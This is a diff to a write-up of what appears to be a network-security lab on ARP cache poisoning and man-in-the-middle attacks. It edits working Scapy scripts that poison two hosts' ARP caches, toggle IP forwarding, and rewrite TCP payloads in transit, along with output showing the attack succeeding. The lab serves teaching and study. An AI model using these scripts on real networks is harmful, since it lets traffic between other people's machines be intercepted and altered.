@@ -35,7 +35,7 @@ sendp(pkt)
 
 This successfully poisons the ARP cache of host `A`, as shown by:
 
-```
+```console
 $ arp -n
 Address     HWtype  HWaddress           Flags Mask  Iface
 10.9.0.6    ether   02:42:0a:09:00:69   C           eth0
@@ -122,11 +122,11 @@ To maintain the poisoned state, ARP packets must be sent periodically:
 from scapy.all import *
 import time
 
-pkt_A = Ether(src=MAC_M, dst=MAC_BCAST) / ARP(
+pkt_A = Ether(src=MAC_M, dst=MAC_A) / ARP(
     psrc=IP_B, hwsrc=MAC_M, pdst=IP_A, op=1
 )
 
-pkt_B = Ether(src=MAC_M, dst=MAC_BCAST) / ARP(
+pkt_B = Ether(src=MAC_M, dst=MAC_B) / ARP(
     psrc=IP_A, hwsrc=MAC_M, pdst=IP_B, op=1
 )
 
@@ -142,17 +142,17 @@ This establishes the MITM position.
 
 ### 2.2 Testing
 
-After the attack is active, connectivity between `A` and `B` is tested.
+While the script is executing, connectivity between `A` and `B` is tested.
 
 If IP forwarding is **disabled** on `M`:
 
-```bash
+```shell
 sysctl -w net.ipv4.ip_forward=0
 ```
 
 packets are dropped and communication fails:
 
-```
+```console
 PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
 
 --- 10.9.0.6 ping statistics ---
@@ -165,13 +165,13 @@ PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
 
 When IP forwarding is **enabled** again:
 
-```bash
+```shell
 sysctl -w net.ipv4.ip_forward=1
 ```
 
 packets successfully reach the destination, confirming that the MITM attack is working:
 
-```
+```console
 64 bytes from 10.9.0.6: icmp_seq=1 ttl=63 time=0.454 ms
 ```
 
@@ -194,6 +194,7 @@ from scapy.all import *
 
 def spoof_pkt(pkt):
     if pkt.haslayer(IP) and pkt.haslayer(TCP):
+        # Modify packets coming from A
         if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
             newpkt = IP(bytes(pkt[IP]))
             del newpkt.chksum
@@ -202,6 +203,7 @@ def spoof_pkt(pkt):
 
             if pkt[TCP].payload:
                 data = pkt[TCP].payload.load
+                # Replace printable characters with 'z' and leave whitespace untouched
                 newdata = bytes(
                     byte if byte <= 0x20 else ord('z')
                     for byte in data
@@ -256,6 +258,7 @@ def spoof_pkt(pkt):
             del newpkt[TCP].chksum
             del newpkt[TCP].payload
 
+            # Modify payload
             if pkt[TCP].payload:
                 data = pkt[TCP].payload.load
                 newdata = data.replace(NAME, REPL)
